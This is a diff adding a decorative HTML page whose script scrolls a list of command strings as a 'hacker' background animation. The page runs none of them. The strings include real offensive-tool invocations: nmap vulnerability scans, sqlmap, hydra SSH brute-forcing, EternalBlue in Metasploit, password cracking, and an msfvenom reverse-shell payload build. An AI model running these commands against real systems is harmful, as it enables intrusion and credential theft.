@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>I am Lain. Lain is everywhere.</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"/>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Courier New', monospace;
+    }
+
+    .background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      background-image: url('/assets/i_am_lain.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .code-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    .code-line {
+      position: absolute;
+      color: #00ff9d;
+      font-size: 14px;
+      white-space: nowrap;
+      text-shadow: 0 0 5px rgba(0, 255, 157, 0.7);
+      animation: code-scroll 20s linear infinite;
+    }
+
+    @keyframes code-scroll {
+      0% { transform: translateY(100vh); opacity: 0; }
+      10% { opacity: 1; }
+      100% { transform: translateY(-100%); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+  <div class="code-container" id="code-container"></div>
+
+  <script>
+    const commands = [
+      'nmap -sV -p- --script=vuln 192.168.1.1',
+      'sqlmap -u "http://target.com/page.php?id=1" --dbs',
+      'import tensorflow as tf',
+      'class AgentNetwork(LLMBaseModel):',
+      'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10',
+      'def exploit_vulnerability(target, payload):',
+      'metasploit> use exploit/windows/smb/ms17_010_eternalblue',
+      'from langchain import LLMChain, agents',
+      'async def scan_network(subnet):',
+      'dirb http://target.com/ /usr/share/dirb/wordlists/common.txt',
+      'agents = create_hierarchical_agents(base_llm, tools)',
+      'hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt',
+      'def generate_report(vulnerabilities, exploits):',
+      'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe',
+      'model = LlamaForCausalLM.from_pretrained("security-llama")',
+      'wireshark -i eth0 -f "port 80" -w capture.pcap',
+      'class NetworkIntrusion(BaseExploit):',
+      'john --format=sha256crypt --wordlist=passwords.txt hashes.txt'
+    ];
+
+    const usedPositions = new Set();
+    const container = document.getElementById('code-container');
+
+    function getUniqueLeft() {
+      const possiblePercents = [5, 15, 25, 35, 45, 55, 65, 75, 85, 95];
+      let attempts = 0;
+      let left;
+      do {
+        left = possiblePercents[Math.floor(Math.random() * possiblePercents.length)];
+        attempts++;
+      } while (usedPositions.has(left) && attempts < 20);
+      usedPositions.add(left);
+      return left;
+    }
+
+    commands.forEach((cmd, i) => {
+      const div = document.createElement('div');
+      div.classList.add('code-line');
+      const left = getUniqueLeft();
+      const delay = -(Math.random() * 20).toFixed(1);
+      div.style.left = `${left}%`;
+      div.style.animationDelay = `${delay}s`;
+      div.textContent = cmd;
+      container.appendChild(div);
+    });
+  </script>
+</body>
+</html>
